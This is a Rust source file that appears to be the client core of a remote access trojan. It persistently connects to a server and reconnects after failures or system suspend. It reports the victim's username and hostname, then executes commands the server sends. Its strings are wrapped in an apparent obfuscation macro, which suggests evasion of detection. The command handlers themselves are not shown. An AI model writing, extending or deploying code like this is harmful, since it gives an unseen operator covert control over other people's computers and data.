use core::fmt;
use std::{
    io::{Read, Write},
    net::TcpStream,
    sync::Arc,
    thread, time,
    time::{Duration, SystemTime},
};

use anyhow::{anyhow, Result};
use async_recursion::async_recursion;
use lazy_static::lazy_static;
use tracing::{error, info};

use crate::{
    commands::CommandsManager, crypto, error_crypt, globals, info_crypt, unwrap::CustomUnwrap,
};

pub const MAX_PACKET_LEN: usize = 65536;

lazy_static! {
    pub static ref COMMANDS: CommandsManager = CommandsManager::new();
}

#[async_recursion(?Send)]
pub async fn connect(addr: &str) {
    loop {
        if let Ok(mut client) = Client::new(addr) {
            info_crypt!("Connected!");

            // reconnect if error
            if let Err(err) = client.run().await {
                error!("{}: {}", crypto!("Unexpected error"), err);
            }
        }

        error_crypt!("Error connecting to server... Reconnecting after 10s...");

        // wait 10 seconds before reconnect
        thread::sleep(time::Duration::from_secs(10));

        // reconnect
        connect(addr).await;
    }
}

#[derive(Clone)]
pub struct Client {
    pub stream: Arc<TcpStream>,
    pub connected: bool,
    pub reconnecting: bool,
}

impl Client {
    pub fn new(address: &str) -> Result<Self> {
        // connect to the server
        let stream = TcpStream::connect(address)?;

        Ok(Self {
            stream: Arc::new(stream),
            connected: true,
            reconnecting: false,
        })
    }

    pub fn receive(&mut self) -> Result<String> {
        // allocate an empty buffer
        let mut data = [0; MAX_PACKET_LEN];

        // read buffer
        let len = self.stream.as_ref().read(&mut data)?;

        if len == 0 {
            return Err(anyhow!(crypto!("Connecting closed")));
        }

        // get buffer without "empty" bytes
        let recv_buf = &data[0..len];

        // parse buffer into String
        let buf_str = String::from_utf8(recv_buf.to_vec())?;

        info!("{}: {}", crypto!("[Recived]"), buf_str);

        Ok(buf_str)
    }

    // pub fn rawdata_recieve(&mut self) -> Result<Vec<u8>> {
    //     // allocate an empty buffer
    //     let mut data = [0; 65536];

    //     // read buffer
    //     let len = self.stream.read(&mut data)?;

    //     // get buffer without "empty" bytes
    //     let recv_buf = &data[0..len];

    //     Ok(recv_buf.to_vec())
    // }

    // pub fn rawdata_send(&mut self, message: &[u8]) -> Result<()> {
    //     self.stream.write_all(message)?;

    //     Ok(())
    // }

    /// Send a message to the server
    pub fn send<S>(&mut self, message: S) -> Result<()>
    where
        S: ToString + fmt::Display,
    {
        info!("{}: {}", crypto!("[Sended]"), message);

        // send message to the server
        self.stream
            .as_ref()
            .write_all(message.to_string().as_bytes())?;

        Ok(())
    }

    /// Send command to the server
    pub fn send_command<S>(&mut self, message: S) -> Result<String>
    where
        S: ToString + fmt::Display,
    {
        // send command
        self.send(message)?;

        // recive command output
        self.receive()
    }

    // Detecting computer suspend and reconnecting
    fn suspend_handler(&mut self) -> anyhow::Result<()> {
        let stream = self.stream.clone();

        thread::spawn(move || {
            info_crypt!("Starting suspend detecting system...");

            loop {
                let time = 1;

                let before = SystemTime::now();
                thread::sleep(Duration::from_secs(time));
                let now = before.elapsed().unwrap();

                if now.as_secs() > time {
                    info_crypt!("Suspend detected... Reconnecting...");
                    stream.shutdown(std::net::Shutdown::Both).unwrap_log();
                    break;
                }
            }
        });

        Ok(())
    }

    /// Close the connection
    pub fn close(&mut self) -> Result<()> {
        self.connected = false;

        self.stream.shutdown(std::net::Shutdown::Both)?;

        Ok(())
    }

    #[async_recursion]
    pub async fn run(&mut self) -> anyhow::Result<()> {
        self.suspend_handler()?;

        // setup client name
        self.send_command(format!(
            "{cmd} {user}@{host}",
            cmd = crypto!("/setname"),
            user = whoami::username(),
            host = whoami::hostname()
        ))?;

        // setting version in server
        self.send_command(format!(
            "{cmd} {version}",
            cmd = crypto!("/about"),
            version = globals::CURRENT_VERSION,
        ))?;

        while self.connected {
            // receive message from the server
            let buf = match self.receive() {
                Ok(message) => message,
                Err(err) => {
                    error!("{}", err);
                    return Ok(());
                },
            };

            // serverd moment - Anti-DDoS
            // if the server returns `unknown command`, skip the message
            if buf
                .to_ascii_lowercase()
                .contains(&crypto!("unknown command"))
            {
                continue;
            }

            async fn handle(client: &mut Client, buf: String) -> anyhow::Result<()> {
                // split message
                let command = buf.split_ascii_whitespace().collect::<Vec<&str>>();

                // parse args to Vec
                let mut args = command[0..command.len()].to_vec();

                let cmd = args[0];

                // remove command name from args
                args = args[1..args.len()].to_vec();

                // find command
                let command = COMMANDS
                    .commands
                    .iter()
                    .enumerate()
                    .find(|&(_i, command)| command.name() == cmd);

                if let Some((_i, cmd)) = command {
                    if args.len() < cmd.min_args() {
                        client.send(crypto!("Missing arguments for the command."))?;

                        return Ok(());
                    }

                    cmd.execute(client, args).await?;
                } else {
                    client.send(crypto!("unknown command"))?;
                }

                Ok(())
            }

            if let Err(err) = handle(self, buf).await {
                error!(
                    "{}: {}",
                    crypto!("Unexpected error in message handler"),
                    err
                );
                self.send(crypto!("[1]Unexpected error"))?;
            }
        }

        Ok(())
    }
}
